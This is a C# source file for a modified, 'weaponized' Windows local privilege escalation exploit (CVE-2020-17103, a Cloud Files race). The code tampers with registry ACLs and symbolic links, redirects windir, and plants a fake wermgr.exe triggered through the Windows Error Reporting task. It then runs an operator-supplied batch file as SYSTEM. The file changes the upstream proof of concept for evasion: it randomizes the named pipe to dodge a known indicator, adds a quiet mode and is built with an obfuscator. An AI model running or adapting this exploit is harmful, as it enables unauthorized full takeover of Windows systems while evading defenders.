// SAPMAP-modified MiniPlasma — Windows LPE to NT AUTHORITY\SYSTEM via cldflt
// race (CVE-2020-17103, silently un-patched per Nightmare-Eclipse 2025).
//
// Upstream PoC: https://github.com/Nightmare-Eclipse/MiniPlasma
// Author: James Forshaw (Google P0, vuln) / Nightmare-Eclipse (weaponization)
// SPDX-License-Identifier: MIT (matches upstream)
//
// Differences from upstream:
//   * NO interactive conhost.exe spawn.  Instead, the SYSTEM context
//     opens a known wrapper batch (%TEMP%\.mp_run.bat) and runs it as
//     SYSTEM via CreateProcessAsUser, capturing stdout to a result
//     file the SAPMAP caller reads back.
//   * Randomized named-pipe name per invocation (env var
//     SAPMAP_MP_PIPE) so the IOC `MiniPlasmaWERPipe` isn't fixed.
//   * Removed all Console.WriteLine debug output (the SAPXPG caller
//     only needs success/failure on the result-file side).
//   * Optional --quiet flag — when present, exits silently on stage
//     errors instead of printing the stack trace.
//
// Build: see tools/miniplasma/build.ps1 (Windows + msbuild + ConfuserEx).

using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using NtApiDotNet;
using NtApiDotNet.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Threading;

namespace SAPMAP_MiniPlasma
{
    static class Program
    {
        // ------------------------------------------------------------
        // Configuration — randomized per-invocation so SAPMAP can
        // stamp a unique pipe name + wrapper path through env vars.
        // Defaults match what sapmap_miniplasma.py expects.
        // ------------------------------------------------------------

        static string PipeName =
            Environment.GetEnvironmentVariable("SAPMAP_MP_PIPE")
            ?? "MP_" + Guid.NewGuid().ToString("N").Substring(0, 12);

        static string WrapperPath =
            Environment.GetEnvironmentVariable("SAPMAP_MP_WRAPPER")
            ?? @"C:\Windows\Temp\.mp_run.bat";

        static bool _quiet = false;

        static void Log(string msg)
        {
            if (_quiet) return;
            Console.WriteLine("[mp] " + msg);
        }

        // ------------------------------------------------------------
        // Registry / cldflt primitive plumbing — same as upstream
        // ------------------------------------------------------------

        static NtKey OpenKey(NtKey root, string path, KeyAccessRights desired_access)
        {
            using (var obja = new ObjectAttributes(path, AttributeFlags.OpenLink, root))
            {
                using (var key = NtKey.Open(obja, desired_access, KeyCreateOptions.NonVolatile, false))
                {
                    if (key.IsSuccess)
                        return key.Result.Duplicate();
                }

                using (var imp = NtThread.Current.ImpersonateAnonymousToken())
                {
                    return NtKey.Open(obja, desired_access, KeyCreateOptions.NonVolatile);
                }
            }
        }

        static void SetSecurityDescriptor(NtKey key, SecurityInformation info)
        {
            var sd = new SecurityDescriptor("D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)S:(ML;OICI;NW;;;S-1-16-0)");
            key.SetSecurityDescriptor(sd, info);
        }

        static void ForceKeyDeleteKey(NtKey root, string name)
        {
            using (var key = OpenKey(root, name, KeyAccessRights.WriteDac))
            {
                SetSecurityDescriptor(key, SecurityInformation.Dacl);
            }
            using (var key = OpenKey(root, name, KeyAccessRights.WriteOwner))
            {
                SetSecurityDescriptor(key, SecurityInformation.Label);
            }
            using (var new_key = OpenKey(root, name, KeyAccessRights.Delete | KeyAccessRights.EnumerateSubKeys))
            {
                DeleteRegistryTree(new_key);
                new_key.Delete();
            }
        }

        static void DeleteRegistryTree(NtKey root)
        {
            foreach (var name in root.QueryKeys())
            {
                ForceKeyDeleteKey(root, name);
            }
        }

        [Flags]
        enum AbortHydrationFlags
        {
            None = 0,
            Unblock = 1,
            Block = 2,
        }

        [DllImport("cldapi.dll", CharSet = CharSet.Unicode)]
        static extern int CfAbortOperation(int pid, IntPtr unknown, AbortHydrationFlags flags);

        [StructLayout(LayoutKind.Sequential)]
        struct CF_PLATFORM_INFO
        {
            public int BuildNumber;
            public int RevisionNumber;
            public int IntegrationNumber;
        }

        [DllImport("cldapi.dll", CharSet = CharSet.Unicode)]
        static extern int CfGetPlatformInfo(out CF_PLATFORM_INFO PlatformVersion);

        static void ForceTokenThread(object obj)
        {
            try
            {
                using (var thread = (NtThread)obj)
                {
                    using (var token = TokenUtils.GetAnonymousToken())
                    {
                        while (true)
                        {
                            thread.SetImpersonationToken(token);
                            thread.SetImpersonationToken(null);
                        }
                    }
                }
            }
            catch (ThreadAbortException) { return; }
            catch { /* swallow — exploit success is signaled via the
                       result file, not stderr */ }
        }

        const string ROOT_KEY = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft";
        static string CLOUD_FILES = $@"{ROOT_KEY}\CloudFiles";
        static string BLOCKED_APPS = $@"{CLOUD_FILES}\BlockedApps";
        const string TARGET_KEY = @"\Registry\User\.DEFAULT\Volatile Environment";

        static void CheckKeyThread(object root_key)
        {
            string path = (bool)root_key ? ROOT_KEY : @"\Registry\User\.DEFAULT";
            try
            {
                using (var key = NtKey.Open(path, null, KeyAccessRights.MaximumAllowed))
                {
                    while (true)
                    {
                        if (key.NotifyChange(NotifyCompletionFilter.Name, true) == NtStatus.STATUS_NOTIFY_ENUM_DIR)
                        {
                            Environment.Exit(0);
                            break;
                        }
                    }
                }
            }
            catch { /* swallow */ }
        }

        static int Check(this int hr)
        {
            if (hr < 0)
                Marshal.ThrowExceptionForHR(hr);
            return hr;
        }

        const int MAX_STAGE = 4;

        static void Stage0()
        {
            for (int i = 1; i < MAX_STAGE; ++i)
            {
                Win32ProcessConfig config = new Win32ProcessConfig
                {
                    CommandLine = $"run {i}",
                    ApplicationName = typeof(Program).Assembly.Location,
                    TerminateOnDispose = true
                };

                using (var p = Win32Process.CreateProcess(config))
                {
                    if (p.Process.Wait(10) != NtStatus.STATUS_SUCCESS)
                    {
                        throw new ArgumentException($"Failed to run stage {i}");
                    }
                }
            }
        }

        static void Stage1(bool root_key)
        {
            Thread check_key_th = new Thread(CheckKeyThread);
            check_key_th.IsBackground = true;
            check_key_th.Start(root_key);
            Thread.Sleep(1000);

            var th = NtThread.OpenCurrent();
            var anon_thread = new Thread(ForceTokenThread)
            {
                IsBackground = true
            };
            anon_thread.Start(th);

            while (true)
            {
                CfAbortOperation(NtProcess.Current.ProcessId,
                    IntPtr.Zero, AbortHydrationFlags.Block);
            }
        }

        static void Stage2()
        {
            using (var key = OpenKey(null, CLOUD_FILES, KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner | KeyAccessRights.EnumerateSubKeys))
            {
                SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
                DeleteRegistryTree(key);
            }
            NtKey.CreateSymbolicLink(BLOCKED_APPS, null, TARGET_KEY);
            Stage1(false);
        }

        static void Stage3()
        {
            using (var key = OpenKey(null, BLOCKED_APPS, KeyAccessRights.Delete))
            {
                key.Delete();
            }
            using (var key = OpenKey(null, TARGET_KEY, KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner))
            {
                SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
            }
            var key2 = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment", RegistryRights.FullControl);
            foreach (var subkey in key2.GetSubKeyNames())
            {
                var fullsubkey = TARGET_KEY + @"\" + subkey;
                NtKey _subkey;
                try
                {
                    _subkey = NtKey.Open(fullsubkey, null, KeyAccessRights.WriteDac);
                }
                catch
                {
                    _subkey = OpenKey(null, fullsubkey, KeyAccessRights.WriteDac);
                }
                SetSecurityDescriptor(_subkey, SecurityInformation.Dacl);
                _subkey.Close();
                _subkey = NtKey.Open(fullsubkey, null, KeyAccessRights.Delete);
                _subkey.Delete();
                _subkey.Close();
            }
            key2.Close();
            using (NtKey ntarget = NtKey.Open(TARGET_KEY, null, KeyAccessRights.SetValue))
            {
                ntarget.SetValue("windir", Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName));
            }

            string fakesys32 = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) + @"\System32";
            Directory.CreateDirectory(fakesys32);
            string fakewer = fakesys32 + @"\wermgr.exe";
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, fakewer, true);

            var srvnamedpipe = new NamedPipeServerStream(PipeName);
            System.Threading.Tasks.Task pipewait = srvnamedpipe.WaitForConnectionAsync();

            using (TaskService tasksvc = new TaskService())
            {
                Task wertask = tasksvc.GetTask(@"\Microsoft\Windows\Windows Error Reporting\QueueReporting");
                wertask.Run();
                wertask.Dispose();
            }
            if (!pipewait.Wait(5000))
            {
                Log("Stage3: WER pipe timeout — exploit failed");
            }
            else
            {
                Log("Stage3: SYSTEM trampoline reached pipe");
            }
            srvnamedpipe.Dispose();
            Thread.Sleep(1000);
            try
            {
                File.Delete(fakewer);
                Directory.Delete(fakesys32);
            }
            catch { }
            try
            {
                using (NtKey ntarget = NtKey.Open(TARGET_KEY, null, KeyAccessRights.Delete))
                {
                    ntarget.Delete(false);
                }
            }
            catch { }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetNamedPipeServerSessionId(IntPtr Pipe, out UInt32 ClientProcessId);

        // ------------------------------------------------------------
        // SYSTEM context: run the SAPMAP wrapper batch, capture output
        // to the result file, exit.  No interactive conhost.
        // ------------------------------------------------------------
        static void RunWrapperAsSystem()
        {
            // The fake wermgr.exe runs in SYSTEM context inside the
            // svchost (WER service) session.  Bounce back through the
            // pipe so the originator knows we made it, then spawn the
            // operator-supplied wrapper batch.
            Environment.SetEnvironmentVariable("windir", @"C:\Windows",
                EnvironmentVariableTarget.Process);

            var namedpipeclient = new NamedPipeClientStream(PipeName);
            namedpipeclient.Connect();
            UInt32 nSesID;
            IntPtr hPipe = namedpipeclient.SafePipeHandle.DangerousGetHandle();
            if (!GetNamedPipeServerSessionId(hPipe, out nSesID))
                return;
            namedpipeclient.Dispose();

            NtToken token = NtToken.OpenEffectiveToken();
            NtToken token2 = token.DuplicateToken();
            token.Dispose();
            token = token2;
            token.SetSessionId((int)nSesID);

            // CreateProcessAsUser: cmd.exe /C <wrapper.bat>.  The
            // wrapper itself handles stdout redirection to the result
            // file — keeps this exe simple.
            string cmdLine = string.Format("/C \"{0}\"", WrapperPath);
            Win32Process.CreateProcessAsUser(token,
                @"C:\Windows\System32\cmd.exe", cmdLine,
                CreateProcessFlags.None, null);
        }

        static void Main(string[] args)
        {
            // Parse --quiet / -q at any position
            foreach (var a in args)
            {
                if (a == "--quiet" || a == "-q")
                {
                    _quiet = true;
                    break;
                }
            }

            bool isSystem;
            using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
            {
                isSystem = identity.IsSystem;
            }
            if (isSystem)
            {
                RunWrapperAsSystem();
                return;
            }

            try
            {
                CfGetPlatformInfo(out CF_PLATFORM_INFO _).Check();

                if (args.Length <= 1)
                {
                    int stage = args.Length > 0 ? int.Parse(args[0]) : 0;
                    switch (stage)
                    {
                        case 0: Stage0(); break;
                        case 1: Stage1(true); break;
                        case 2: Stage2(); break;
                        case 3: Stage3(); break;
                        default: throw new ArgumentException("invalid stage");
                    }
                }
                else
                {
                    // Two-arg form: <user> <password> — logon impersonation
                    // path from upstream.  Retained for completeness.
                    using (var token = TokenUtils.GetLogonUserToken(args[0], "", args[1], SecurityLogonType.Network, null))
                    {
                        using (var imp = token.Impersonate())
                        {
                            CfAbortOperation(NtProcess.Current.ProcessId, IntPtr.Zero, AbortHydrationFlags.Block).Check();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                if (!_quiet) Console.WriteLine(ex.Message);
                Environment.Exit(1);
            }
        }
    }
}
